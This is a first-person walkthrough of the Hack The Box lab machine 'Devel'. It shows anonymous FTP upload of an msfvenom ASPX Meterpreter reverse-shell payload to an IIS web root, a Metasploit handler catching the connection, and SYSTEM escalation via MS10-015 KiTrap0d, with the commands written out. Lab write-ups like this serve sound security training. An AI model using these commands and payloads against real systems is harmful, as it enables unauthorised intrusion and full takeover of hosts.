# Devel

## Machine Information

| Machine    | Devel          |
| ---------- | -------------- |
| Platform   | Hack The Box   |
| Difficulty | Easy           |
| OS         | Windows        |
| IP         | `10.129.38.56` |

---

## Attack Path

```text
Anonymous FTP
      │
      ▼
FTP file upload
      │
      ▼
IIS Web Server
      │
      ▼
Upload ASPX payload
      │
      ▼
Meterpreter session
      │
      ▼
MS10-015 (KiTrap0d)
      │
      ▼
SYSTEM privileges
```

---

# 1. Reconnaissance

I started with a full TCP port scan to identify the services exposed by the target.

```bash
nmap -p- --min-rate 5000 -oN nmap-allports.txt 10.129.38.56
```

The scan revealed several interesting ports, including:

```text
21/tcp    FTP
80/tcp    HTTP
135/tcp   MSRPC
139/tcp   NetBIOS
445/tcp   Microsoft-DS
3389/tcp  RDP
```

I then performed a more detailed scan against the discovered services:

```bash
nmap -sC -sV -p21,80,135,139,445,3389 10.129.38.56
```

The results showed that the target was running a Windows system with an IIS web server and an FTP service.

---

# 2. Anonymous FTP Access

The FTP service allowed anonymous authentication.

```bash
ftp 10.129.38.56
```

I connected using:

```text
Username: anonymous
Password: anonymous
```

<img width="952" height="146" alt="ftp-devel" src="https://github.com/user-attachments/assets/51516a78-d1f2-4342-b066-e87b20520d98" />


After successfully authenticating, I listed the available files:

```ftp
ls
```

The FTP server contained files that appeared to belong to the web server, including:

```text
iisstart.htm
welcome.png
```

At this point, I investigated whether files uploaded to the FTP server were also accessible through the web server.

---

# 3. Identifying the Web Server

The target was running a Microsoft IIS web server.

I confirmed that files placed in the FTP directory were served through the web application.

This was an important discovery because it meant that the FTP service could potentially be used to upload a server-side executable file and then execute it through the web server.

The server supported ASP.NET files with the `.aspx` extension.

---

# 4. Creating the Payload

I created an ASPX payload using `msfvenom`.

The payload was configured to connect back to my attacking machine:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=tun0 \
LPORT=4444 \
-f aspx \
-o devil.aspx
```

The generated file was:

```text
devil.aspx
```

---

# 5. Uploading the Payload via FTP

I connected to the FTP service again:

```bash
ftp 10.129.38.56
```

After authenticating anonymously, I uploaded the payload:

```ftp
put devil.aspx
```

The file was successfully uploaded to the FTP directory.

Because the FTP directory was linked to the IIS web root, the payload was now accessible through the web server.

---

# 6. Configuring the Metasploit Handler

I started Metasploit:

```bash
msfconsole
```

Then configured the handler:

```text
use exploit/multi/handler
```

I selected the same payload used when creating the ASPX file:

```text
set payload windows/meterpreter/reverse_tcp
```

I configured the listener:

```text
set LHOST tun0
set LPORT 4444
```

Then started the handler:

```text
exploit -j
```

The handler was now waiting for the target to connect back.

---

# 7. Obtaining a Meterpreter Session

With the handler running, I accessed the uploaded ASPX file through the web server:

```text
http://10.129.38.56/devil.aspx
```

Once the file was executed by IIS, the target connected back to my machine.

Metasploit reported:

```text
Meterpreter session 1 opened
```

I interacted with the session using:

```text
sessions -i 1
```

I then verified the system information and current user context:

```text
sysinfo
getuid
```

At this point, I had initial access to the Windows machine through Meterpreter.

---

# 8. Privilege Escalation

The Meterpreter session did not initially provide SYSTEM-level privileges.

I used Metasploit's local exploit suggestion functionality to identify potential privilege escalation paths.

The relevant exploit was:

```text
exploit/windows/local/ms10_015_kitrap0d
```

This exploit targets **MS10-015**, also known as **KiTrap0d**, a Windows kernel vulnerability that can be used for local privilege escalation.

I configured the exploit to use the existing Meterpreter session and executed it.

The exploit successfully elevated the session privileges.

After the exploit completed, I verified the new context:

```text
getuid
```

The session now had SYSTEM-level privileges.

---

<img width="957" height="466" alt="nt-autority-system-devel" src="https://github.com/user-attachments/assets/56ff6d55-c125-48a7-9246-0d85dac50f9d" />


# 9. Flags

After obtaining SYSTEM privileges, I accessed the user and administrator directories and retrieved the flags.

```text
User Flag:
<REDACTED>

Root Flag:
<REDACTED>
```

---

# 10. Summary

The complete attack path was:

```text
1. Scan the target with Nmap
2. Discover FTP and IIS services
3. Authenticate anonymously to FTP
4. Identify that uploaded files were served by IIS
5. Identify ASPX as an executable server-side file extension
6. Generate a Meterpreter reverse shell with msfvenom
7. Upload devil.aspx via anonymous FTP
8. Configure a Metasploit multi/handler
9. Execute the payload through the IIS web server
10. Obtain a Meterpreter session
11. Exploit MS10-015 / KiTrap0d
12. Escalate privileges to SYSTEM
13. Retrieve both flags
```

---

## Key Takeaways

* Anonymous FTP access can become critical when users can upload files.
* FTP and HTTP services may share the same directory structure.
* File upload vulnerabilities can become remote code execution when the web server executes uploaded files.
* Always investigate the technologies and file extensions supported by the web server.
* A Meterpreter session is not necessarily the end of the attack; local privilege escalation should always be investigated.
* Metasploit's `local_exploit_suggester` can help identify potential privilege escalation paths.
* Windows kernel vulnerabilities such as **MS10-015 / KiTrap0d** can allow a low-privileged user to escalate to SYSTEM on vulnerable systems.

---

## Tools Used

* Nmap
* FTP
* IIS
* msfvenom
* Metasploit Framework
* Meterpreter
* `exploit/windows/local/ms10_015_kitrap0d`
* `local_exploit_suggester`
